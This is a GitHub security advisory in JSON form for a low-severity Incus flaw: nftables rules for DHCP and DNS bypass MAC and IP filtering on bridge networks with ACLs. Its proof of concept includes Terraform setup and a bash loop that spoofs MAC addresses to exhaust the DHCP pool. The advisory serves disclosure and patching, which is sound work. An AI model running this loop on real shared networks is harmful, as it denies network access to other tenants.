{
	"cvss": {
		"score": 3.4,
		"vector_string": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:L"
	},
	"ghsa_id": "GHSA-9q7c-qmhm-jv86",
	"summary": "DoS through antispoofing nftables firewall rule bypass on bridge networks with ACLs",
	"description": "### Summary\r\n\r\nWhen using an ACL on a device connected to a bridge, Incus generates nftables rules for local services (DHCP, DNS...) that partially bypass security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. This can lead to DHCP pool exhaustion and opens the door for other attacks.\r\n\r\n### Details\r\n\r\nIn commit a7c33301738aede3c035063e973b1d885d9bac7c, the following rules are added at the top of the bridge input chain:\r\n\r\n\tiifname \"{{.hostName}}\" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept\r\n\tiifname \"{{.hostName}}\" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::1:2 udp dport 547 accept\r\n\tiifname \"{{.hostName}}\" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::2 icmpv6 type 133 accept\r\n\r\nHowever, these rules accept packets that should be filtered and maybe dropped by later rules in the \"MAC filtering\" snippet:\r\n\r\n\tiifname \"{{.hostName}}\" ether type arp arp saddr ether != {{.hwAddr}} drop\r\n\tiifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop\r\n\r\nTherefore, the MAC filtering is ineffective on those new rules. This allows an attacker to request as many IP as they want by sending a lot of DHCP requests with different MAC addresses. Doing so, they can exhaust the DHCP pool, resulting in a DoS of the bridge's network.\r\n\r\nAdditionaly, the commit adds non-restricted access to the local dnsmasq DNS server:\r\n\r\n\t{{ if .dnsIPv4 }}\r\n\t{{ range .dnsIPv4 }}\r\n\tiifname \"{{$.hostName}}\" ip daddr \"{{.}}\" tcp dport 53 accept\r\n\tiifname \"{{$.hostName}}\" ip daddr \"{{.}}\" udp dport 53 accept\r\n\t{{ end }}\r\n\t{{ end }}\r\n\r\n\t{{ if .dnsIPv6 }}\r\n\t{{ range .dnsIPv6 }}\r\n\tiifname \"{{$.hostName}}\" ip6 daddr \"{{.}}\" tcp dport 53 accept\r\n\tiifname \"{{$.hostName}}\" ip6 daddr \"{{.}}\" udp dport 53 accept\r\n\t{{ end }}\r\n\t{{ end }}\r\n\r\nAn attacker can send DNS requests with arbitrary MAC and IP addresses as well. These rules should also be after the MAC/IPv4/IPv6 filtering.\r\n\r\n### PoC\r\n\r\nWith this terraform infrastructure:\r\n\r\n```\r\nresource \"incus_network_acl\" \"acl_allow_out\" {\r\n  name    = \"acl-allow-out\"\r\n  egress = [\r\n    {\r\n      action           = \"allow\"\r\n      destination      = \"0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254\"\r\n      state            = \"enabled\"\r\n    },\r\n  ]\r\n}\r\nresource \"incus_network_acl\" \"acl_allow_in\" {\r\n  name    = \"acl-allow-in\"\r\n  ingress = [\r\n    {\r\n      action           = \"allow\"\r\n      state            = \"enabled\"\r\n    },\r\n  ]\r\n}\r\n\r\nresource \"incus_network\" \"br0\" {\r\n  name = \"br0\"\r\n  config = {\r\n    \"ipv4.address\"          = \"10.0.0.1/24\"\r\n    \"ipv4.nat\"              = \"true\"\r\n  }\r\n}\r\n\r\nresource \"incus_instance\" \"machine1\" {\r\n  name  = \"machine1\"\r\n  image = \"images:archlinux/cloud\"\r\n  type = \"virtual-machine\"\r\n  config = {\r\n    \"limits.memory\" = \"2GiB\"\r\n    \"security.secureboot\" = false\r\n    \"boot.autostart\" = false\r\n    \"cloud-init.vendor-data\" = \u003c\u003c-EOF\r\n      #cloud-config\r\n      package_update: true\r\n      packages:\r\n        - dhclient\r\n        - tcpdump\r\n      runcmd:\r\n        - systemctl disable --now systemd.networkd.service\r\n        - systemctl disable --now systemd.networkd.socket\r\n    EOF\r\n  }\r\n  device {\r\n    type = \"disk\"\r\n    name = \"root\"\r\n    properties = {\r\n      pool = \"default\"\r\n      path = \"/\"\r\n      size = \"64GiB\"\r\n    }\r\n  }\r\n  device {\r\n    type = \"nic\"\r\n    name = \"eth0\"\r\n    properties = {\r\n      network = incus_network.br0.name\r\n      \"security.ipv4_filtering\" = true\r\n      \"security.acls\" = join(\",\",\r\n        [\r\n          incus_network_acl.acl_allow_out.name,\r\n          incus_network_acl.acl_allow_in.name,\r\n        ])\r\n    }\r\n  }\r\n}\r\n\r\nresource \"incus_instance\" \"machine2\" {\r\n  name  = \"machine2\"\r\n  image = \"images:archlinux/cloud\"\r\n  type = \"virtual-machine\"\r\n  config = {\r\n    \"limits.memory\" = \"2GiB\"\r\n    \"security.secureboot\" = false\r\n    \"boot.autostart\" = false\r\n  }\r\n  device {\r\n    type = \"disk\"\r\n    name = \"root\"\r\n    properties = {\r\n      pool = \"default\"\r\n      path = \"/\"\r\n      size = \"64GiB\"\r\n    }\r\n  }\r\n  device {\r\n    type = \"nic\"\r\n    name = \"eth0\"\r\n    properties = {\r\n      network = incus_network.br0.name\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nAn attacker in a VM requests many IP addresses and exhaust the pool:\r\n\r\n```bash\r\n[MACHINE1]$ for i in {0..99}; do for j in {0..99}; do ip link set address 10:66:6a:42:${i}:${j} dev enp5s0 ; dhclient -4 -i --no-pid ; done ; done\r\n\r\n[HOST]$ cat /var/lib/incus/networks/br0/dnsmasq.leases  |wc -l\r\n254\r\n\r\n[HOST]$ incus start machine2\r\n```\r\n\r\nAt this point, machine2 will not receive a lease from dnsmasq until another lease expires. If machine1 renews their malicious leases, machine2 will never get a lease.\r\n\r\n### Impact\r\n\r\nAll versions since a7c33301738aede3c035063e973b1d885d9bac7c, so basically v6.12 and v6.13.\r\n",
	"severity": "low",
	"identifiers": [
		{
			"value": "GHSA-9q7c-qmhm-jv86",
			"type": "GHSA"
		},
		{
			"value": "CVE-2025-52889",
			"type": "CVE"
		}
	],
	"published_at": "2025-06-25T14:13:09Z",
	"updated_at": "2025-06-26T11:01:29Z",
	"vulnerabilities": [
		{
			"package": {
				"ecosystem": "go",
				"name": "github.com/lxc/incus/v6/cmd/incusd"
			},
			"vulnerable_version_range": "6.12, 6.13",
			"patched_versions": "6.14"
		}
	],
	"cve_id": "CVE-2025-52889",
	"url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-9q7c-qmhm-jv86",
	"html_url": "https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86",
	"publisher": {
		"login": "stgraber",
		"id": 2230599,
		"node_id": "MDQ6VXNlcjIyMzA1OTk=",
		"avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
		"html_url": "https://github.com/stgraber",
		"gravatar_id": "",
		"type": "User",
		"site_admin": false,
		"url": "https://api.github.com/users/stgraber",
		"events_url": "https://api.github.com/users/stgraber/events{/privacy}",
		"following_url": "https://api.github.com/users/stgraber/following{/other_user}",
		"followers_url": "https://api.github.com/users/stgraber/followers",
		"gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
		"organizations_url": "https://api.github.com/users/stgraber/orgs",
		"received_events_url": "https://api.github.com/users/stgraber/received_events",
		"repos_url": "https://api.github.com/users/stgraber/repos",
		"starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/stgraber/subscriptions"
	},
	"state": "published",
	"credits": [
		{
			"login": "obp-anssi",
			"type": "reporter"
		}
	],
	"credits_detailed": [
		{
			"user": {
				"login": "obp-anssi",
				"id": 95420851,
				"node_id": "U_kgDOBbABsw",
				"avatar_url": "https://avatars.githubusercontent.com/u/95420851?v=4",
				"html_url": "https://github.com/obp-anssi",
				"gravatar_id": "",
				"type": "User",
				"site_admin": false,
				"url": "https://api.github.com/users/obp-anssi",
				"events_url": "https://api.github.com/users/obp-anssi/events{/privacy}",
				"following_url": "https://api.github.com/users/obp-anssi/following{/other_user}",
				"followers_url": "https://api.github.com/users/obp-anssi/followers",
				"gists_url": "https://api.github.com/users/obp-anssi/gists{/gist_id}",
				"organizations_url": "https://api.github.com/users/obp-anssi/orgs",
				"received_events_url": "https://api.github.com/users/obp-anssi/received_events",
				"repos_url": "https://api.github.com/users/obp-anssi/repos",
				"starred_url": "https://api.github.com/users/obp-anssi/starred{/owner}{/repo}",
				"subscriptions_url": "https://api.github.com/users/obp-anssi/subscriptions"
			},
			"type": "reporter",
			"state": "accepted"
		}
	]
}